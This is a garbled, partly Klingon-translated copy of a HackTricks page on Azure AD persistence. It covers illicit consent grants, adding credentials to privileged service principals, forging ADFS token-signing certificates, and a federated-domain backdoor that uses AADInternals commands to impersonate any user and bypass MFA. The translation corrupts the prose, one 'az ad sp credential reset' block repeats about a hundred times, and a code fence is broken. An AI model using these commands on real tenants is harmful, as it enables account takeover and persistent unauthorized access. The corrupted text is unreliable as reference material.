# Az - QaD

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### Illicit Consent Grant

By default, any user can register an application in Azure AD. So you can register an application (only for the target tenant) that needs high impact permissions with admin consent (an approve it if you are the admin) - like sending mail on a user's behalf, role management etc.T his will allow us to **execute phishing attacks** that would be very **fruitful** in case of success.

Moreover, you could also accept that application with your user as a way to maintain access over it.

### Applications and Service Principals

With privileges of Application Administrator, GA or a custom role with microsoft.directory/applications/credentials/update permissions, we can add credentials (secret or certificate) to an existing application.

It's possible to **target an application with high permissions** or **add a new application** with high permissions.

An interesting role to add to the application would be **Privileged authentication administrator role** as it allows to **reset password** of Global Administrators.

This technique also allows to **bypass MFA**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* For certificate based authentication

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% code %}

### Federation - Token Signing Certificate

**DA privileges** on on-prem AD, **Token signing** and **Token Decrypt certificates** can be created and imported with a long validity. This allows us to **log-in as any user** whose ImuutableID we know.

**Run** the below command as **DA on the ADFS server(s)** to create new certs (default password 'AADInternals'), add them to ADFS, disable auto rollver and restart the service:
```powershell
New-AADIntADFSSelfSignedCertificates
```
DaH, Azure AD vItlhutlh certificate vItlhutlh. 

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```

```plaintext
az ad sp credential reset --name <service_principal_name> --cert <certificate_path> --keyvault <keyvault_name> --append
```
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federation - Trusted Domain

**GA privileges** on a tenant, **add a new domain** (must be verified), **configure its authentication type** to Federated and **configure the domain** to **trust a specific certificate** (any.sts in the below command) and issuer:

### Federation - Qa'Hom QaD

**GA privileges** lo'laH tenant, **add a new domain** (must be verified), **configure its authentication type** to Federated and **configure the domain** to **trust a specific certificate** (any.sts in the below command) and issuer:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## References

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
